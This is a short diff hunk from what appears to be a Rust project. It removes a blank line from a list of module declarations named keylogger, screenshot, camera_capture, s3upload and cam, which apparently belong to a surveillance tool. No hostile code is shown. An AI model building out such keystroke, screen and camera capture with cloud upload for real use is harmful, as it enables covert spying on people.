@@ -18,7 +18,6 @@ mod keylogger;
 mod screenshot;
 mod camera_capture;
 mod s3upload;
-
 mod img;
 mod screen;
 mod cam;
